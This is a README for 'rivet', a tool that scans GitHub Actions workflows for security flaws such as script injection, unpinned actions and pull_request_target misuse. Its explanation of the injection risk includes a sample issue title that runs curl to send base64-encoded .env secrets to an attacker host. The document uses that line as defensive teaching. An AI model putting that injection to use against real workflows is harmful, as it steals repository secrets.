# rivet

> **Status: v1.0.0, early development.** This is a prototype. The rule set and
> output formats work and are tested, but the tool is not production-hardened
> yet. Expect rough edges, false positives, and breaking changes before 1.1.

**CI/CD security that doesn't need a 40-page report to be useful**

## Why this exists

I review CI pipelines for a living, and I got tired of doing it by hand.

Here is the problem, concretely. GitHub Actions runs your CI from YAML files that live in your repo under `.github/workflows/`. Those files describe jobs, and some jobs run shell commands. When a job runs, GitHub fills in data from whatever triggered it: the title of the issue, the body of a pull request, the name of the person who opened it. That injected data is called the event context, and in most triggers an outside attacker controls it completely. Anyone can open an issue or a fork PR and type anything they want into those fields.

Now imagine a workflow step like this:

```yaml
run: echo ${{ github.event.issue.title }}
```

A fork issue titled `"; curl attacker.com/exfil?data=$(cat .env | base64) #` turns that harmless-looking line into a shell command that ships your secrets to an attacker's server. The runner executes it with every secret the job can see. That is not a hypothetical. Fork PR titles and issue bodies are attacker input, full stop.

That is one pattern. There are more. An action pinned to `@v3` runs whatever the upstream repo serves today, including after a compromise (this is how Codecov's CI breach spread to thousands of runs in 2021). A workflow triggered on `pull_request_target` runs with your base repo's secrets, so checking out the fork's code in that workflow hands the fork author arbitrary code execution. Missing permission limits mean one compromised step becomes a repo-wide breach.

The tooling to catch this stuff is fragmented. `actionlint` checks whether your YAML is valid, but a syntactically perfect workflow can still be dangerous. `zizmor` is a good tool but opinionated about things I disagree with. GitHub's own scanning is thin. And none of them are built for what a product security engineer actually needs: audit dozens of repos in a row, gate CI merges on findings, and feed results into a security platform.

rivet is the command I wanted for that job: one run, one answer, an exit code I can gate on.

## What it does, step by step

You point rivet at a repo. It finds every workflow file, reads each one, and checks it against ten security rules. For every problem it finds, it prints a finding: which rule fired, how bad it is, the exact file and line, a plain-English explanation of why it matters, and a concrete suggestion for fixing it.

A finding is one specific thing wrong, not a vague warning. Here is what one looks like:

```
✗ CRITICAL script-injection .github/workflows/pr.yml:9
  │ run step interpolates untrusted context `github.event.issue.title`
  │ Event fields like issue titles are fully attacker-controlled…
  └ fix: Bind the value to an env var, then reference it
```

Reading that top to bottom: the symbol and color tell you severity, then the rule name, then where. The first line says what was found. The second says why you should care. The last says what to do about it.

When rivet finishes, its exit code is the answer to the one question it exists to answer:

| Code | Meaning |
|------|---------|
| `0` | Pass: nothing at or above your threshold (default is `high`) |
| `2` | Policy breach: something that bad exists, so fail the gate |
| `1` | System error: rivet could not finish the audit (unreadable path, a workflow it could not parse, a bad `rivet.yaml`) |

This matters for CI. Your pipeline step fails on `2`, which blocks the merge. `1` also fails, but for a different reason: rivet is telling you it could not answer the question, and in security tooling, "I don't know" is not a pass.

`2` beats `1` on purpose: if we found critical issues, that is the headline even when some other file also failed to parse.

Three things rivet will never do, because the whole point of the tool is being safe to run on code you do not trust:

- **It never runs your workflows.** Nothing executes. Steps are text to read, not programs to run.
- **It never computes expressions.** When it sees `${{ }}`, it looks at the shape of the text inside (does it reference an attacker-controlled field?) but never evaluates anything. That is why it is syntax matching, not a sandbox.
- **It never touches the network or writes files.** There is no network code and no file-writing code anywhere in the binary. You can run it against the most hostile repo you can find.

## Install

```bash
cargo build --release
# or
cargo install rivet        # once it's on crates.io
```

Pre-built binaries for Linux, macOS, and Windows are on the [releases page](https://github.com/yourpwnguy/rivet/releases).

## Usage

```bash
rivet --path ./myrepo                 # audit one repo
rivet --path ./repos --recursive      # audit many, per-repo table
rivet --path . -o json | jq '.[] | select(.severity=="high")'
rivet --path . --fail-on high -q      # CI gate, exit code only
rivet --path . --fix-dry              # show patches, write nothing
```

Every flag has a short and a long form. You will mostly reach for `-p` in scripts and `--path` when typing by hand:

| Flag | Short | Long | What it does |
|------|-------|------|--------------|
| Path | `-p` | `--path` | Repo or directory to scan (default: `.`) |
| Recursive | `-r` | `--recursive` | Descend into subdirectories looking for `.github/workflows` |
| Fail on | `-f` | `--fail-on` | How bad a finding has to be to fail the gate: `critical`, `high` (default), `medium`, `low`, `info` |
| Format | `-o` | `--format` | `text` (default, for humans), `json` (for tools), or `table` (per-repo summary for many repos) |
| Quiet | `-q` | `--quiet` | Print nothing; the exit code is the entire output. For scripts. |
| No color | `-c` | `--no-color` | No ANSI colors. Also automatic with `NO_COLOR` set, `TERM=dumb`, or piped (non-TTY) output |
| Repo visibility | `-v` | `--repo-visibility` | `public` / `private` / `unknown`. Declares whether the repo is public, which decides one rule (below) |
| Fix dry | `-d` | `--fix-dry` | Show the full fix for each finding as a paste-ready block, without changing any file |

### A typical CI gate

The pattern most people want. Run this as a step in your pipeline; if anything high or worse shows up, the step fails and the merge is blocked:

```bash
rivet --path . --fail-on high -q
echo $?   # 0 = clean, 2 = breach, 1 = rivet itself broke
```

Start strict teams at `--fail-on critical` and tighten to `high` once the team trusts the signal. A gate that cries wolf gets disabled in a week, so the threshold is yours to tune.

## The rules, explained

Each rule is one independent check. Every match becomes a finding with a severity. Severities mean: CRITICAL is stop and fix now, HIGH is fix before merging, MEDIUM is a real risk that depends on context, LOW is hygiene, INFO is a note for your future self.

| ID | Severity | What it checks, in plain terms |
|----|----------|-------------------------------|
| `script-injection` | CRITICAL | A `run:` step drops attacker-controlled data (issue title, PR body, author name) straight into a shell command. Anyone who can open an issue or PR gets code execution on your runner. The fix is always the same: put the value in an `env:` variable first, then reference `"$VAR"`, because the shell never re-reads a variable's contents as syntax |
| `pull-request-target` | HIGH / INFO | A workflow triggered by `pull_request_target` (which runs with your base repo's secrets) also checks out the fork's code. That combination is remote code execution: the fork author runs anything they want with your secrets. If the workflow only reads metadata (posting comments, adding labels) and never checks out code, this downgrades to INFO, which does not fail the gate |
| `unpinned-action` | HIGH / MEDIUM | A `uses:` line points at a moving target instead of an exact commit. `@master` or `@main` (HIGH) means the code you run today can silently change tomorrow. `@v3` (MEDIUM) is a tag that can be force-pushed by whoever owns the upstream repo. The only safe pattern is all 40 hex characters of a commit SHA |
| `overly-broad-permissions` | HIGH | The `permissions:` block is missing (so the token's power comes from your org default, which is often write-all), or it says `write-all`, or it grants `id-token: write` with no cloud role being assumed, or it grants more than your `rivet.yaml` allows. Least privilege for CI tokens |
| `secret-exfiltration` | HIGH | A `${{ secrets.* }}` reference sits directly inside a `run:` script, where every child process can see it, especially next to network tools like `curl`, `wget`, or `nc`. Pass secrets through `env:` instead so they stay out of the command line and the process table |
| `self-hosted-runner` | MEDIUM | A job runs on `runs-on: self-hosted` while the repo is public. Any fork PR can then execute code on infrastructure your org owns, with whatever credentials that machine holds. Only fires when you declare the repo public, because a local checkout looks identical whether the remote is public or private |
| `fork-secrets` | MEDIUM | A workflow that runs on ordinary `pull_request` references `secrets.*`. Fork PRs get a read-only token and no secrets by default, so this either breaks at runtime or, worse, leaks under a custom org setup that does provide them |
| `reusable-workflow-pin` | LOW | A shared workflow (`org/repo/.github/workflows/x.yml@ref`) pulled in by mutable ref. Same supply-chain logic as unpinned actions, one level up |
| `debug-logging` | INFO | `ACTIONS_STEP_DEBUG: true` in a `pull_request_target` workflow with no `::add-mask::` anywhere. Debug logging can print masked values in full, which quietly defeats masking exactly where secrets are present |
| `artifact-poisoning` | MEDIUM | A `workflow_run` workflow (which runs privileged, after another workflow finishes) downloads a build artifact by name with no SHA check. The triggering workflow's output is attacker-influenced, so an unverified artifact is a poisoned input |

## Example output

```
rivet · 4 workflows · 14 jobs · 6ms
────────────────────────────────────────────────────────────────

✗ CRITICAL script-injection .github/workflows/pr.yml:9
  │ run step interpolates untrusted context `github.event.issue.title`
  │ Event fields like issue titles are fully attacker-controlled…
  └ fix: Bind the value to an env var, then reference it

✗ HIGH pull-request-target .github/workflows/build.yml:7
  │ pull_request_target workflow checks out PR head
  │ pull_request_target runs with the base repo's secrets…
  └ fix: Remove the checkout step, or switch the trigger to `pull_request`

────────────────────────────────────────────────────────────────
1 critical · 3 high · 2 medium · 6ms
```

The top line is the scan summary: how many files, how many jobs, how long it took. Each finding is one block. The last line counts findings by severity.

## Configuration

There is an optional `rivet.yaml` at the scan root. It exists for exactly two things rivet cannot figure out on its own:

```yaml
repo_visibility: public       # public | private | unknown

permissions:
  granted_max:                 # the most each permission may be granted here
    contents: read
```

Why those two? A local checkout looks the same whether the remote repo is public or private, so rivet cannot know on its own, and the self-hosted rule only makes sense for public repos. And `granted_max` is how you declare what your repo actually needs: if your repo only ever reads code, you say `contents: read`, and anything granted beyond that gets flagged. That is how a broad `write` stops being "probably fine" and starts being a finding.

## Suppressing findings

rivet errs toward flagging, on purpose. It would rather show you a safe pattern than miss a dangerous one. When your team has reviewed a finding, accepted the risk, and wants the gate to stay green, you say so inline with a comment on the finding's line (or the line directly above it):

```yaml
- uses: actions/checkout@v3 # rivet:ignore unpinned-action
```

That suppresses only that one rule, at that one spot. It stays in the file, visible in code review, so accepted risk never silently disappears. This is the correct way to handle false positives: loudly, in the open, where the next reviewer sees it.

## How it works

Two crates, one rule about which way dependencies point: the CLI does I/O, the core does everything else.

```
crates/core (rivet-core)   pure analysis: model, parse, rules, engine
crates/cli (rivet)         binary: arguments, filesystem, rendering, exit codes
```

Concretely: the core never reads a file, never prints anything, never touches the process. It receives parsed workflows and returns findings. Rules are small pure functions behind a `Rule` trait, which is a fancy way of saying each rule is an independent check with the same shape, so adding a new one means writing one file and registering it in one list. Findings carry everything a report needs (what, where, why, how to fix), so the part of the code that draws the terminal output never has to re-derive security knowledge. Output is always sorted worst-first, which keeps snapshots and CI diffs stable.

## Development

```bash
just check        # test + clippy + fmt
just test         # 85 tests: unit, fixtures, fuzz, end-to-end
just bench        # parse / evaluate / corpus
just dogfood      # rivet auditing its own workflows
```

## Current limitations

These are scope decisions, not bugs. Each one is something I chose not to do in v1, and I will tell you what to use instead where a good answer exists:

- **rivet pattern-matches expressions, it does not evaluate them.** If a dangerous context is hidden inside a ternary (`${{ cond && github.event.x || 'safe' }}`), rivet may not catch it. It reads the shape of the expression, not its runtime value, so anything that needs real evaluation is out of reach.
- **rivet checks that actions are pinned, not what the pinned code does.** Reading and judging the source of every action you consume is a different tool. Pinning means you at least notice when it changes.
- **The `id-token: write` check is a flag, not an audit.** rivet notices when the capability is granted without any cloud role being assumed. Reviewing the actual AWS, GCP, or Azure trust relationship behind that role is out of scope.
- **rivet does not hunt hardcoded secrets.** It catches *usage patterns* of `${{ secrets.* }}` that lead to exfiltration. If you want to find `password: hunter2` sitting in YAML, TruffleHog is the right tool.
- **Everything is local file parsing.** rivet never calls the GitHub API. Cross-referencing repo visibility, runner groups, and branch protection from the platform side is a v2 idea (below).
- **rivet is not `actionlint`.** It does not validate schema, expression syntax, or action inputs. Run it layered on top of actionlint, not instead of it.
- **False positives happen.** The tool would rather flag a safe pattern than miss a dangerous one. That is what `# rivet:ignore` is for (above).

## Goals and plan

This is where I want rivet to go. It is a direction, not a promise. Expect it to change as real users hit real walls.

**Making it adoptable in strict environments (the hard part):**

A strict company cannot flip this on for every repo at once, because every legacy workflow with `actions/checkout@v3` would fail the gate on day one and the tool would be disabled by Friday. The missing piece is **baseline mode**: accept today's findings as known, and only fail on new ones. That single feature is what turns a scary rollout into a safe one, and it is the most important thing on this list.

Next to it: **SARIF output**, which is simply the file format GitHub's Security tab understands, so findings land where developers already look instead of in a CI log nobody opens. A **composite action** wrapper (a one-line `uses:` that runs rivet) so teams can install it without a curl step to review. And a **`--changed-only`** mode that scans just the workflows a pull request touches, because strict pipelines want the smallest possible scope per run.

**Making it smarter:**

**Declarative custom rules in `rivet.yaml`.** Teams have internal actions and internal patterns rivet does not know about. The answer is pattern rules written as config data (a regex over `uses:`, a message, a fix), checked against the same model the built-in rules use, reviewed in the same pull request as the workflow. That is the "rule book" people ask for. A full plugin system is the wrong answer for a security gate: gates need trusted, stable rule sets, and nobody should let arbitrary third-party code decide whether their merges pass.

**Per-rule severity overrides**, because some teams accept the noise from one rule and hate it from another. That decision belongs in config, not in code.

**Making it complete:**

**GitHub API mode** so you can scan repos and orgs without cloning them, and cross-reference what the platform knows (repo visibility, runner groups, branch protection) with what the files say. **Auto-fix (`--fix`)** that rewrites workflows in place with pinned SHAs and env-var patterns; `--fix-dry` already shows what that would look like, and in-place editing only comes after the dry run earns trust. **Composite action analysis**, recursively auditing `.github/actions/*/action.yml`, because first-party actions you wrote yourself can have the same bugs.

**What I will not do:** turn this into a platform. The ten rules are the trusted engine; everything else is policy data layered on top. A security gate with arbitrary plugins is a linter with opinions, and nobody should gate their merges on that.

## Why "rivet"?

A rivet is a permanent fastener, the thing that holds CI together. Also: short, memorable, and the point is that supply chains shouldn't be held together with duct tape.

## License

MIT
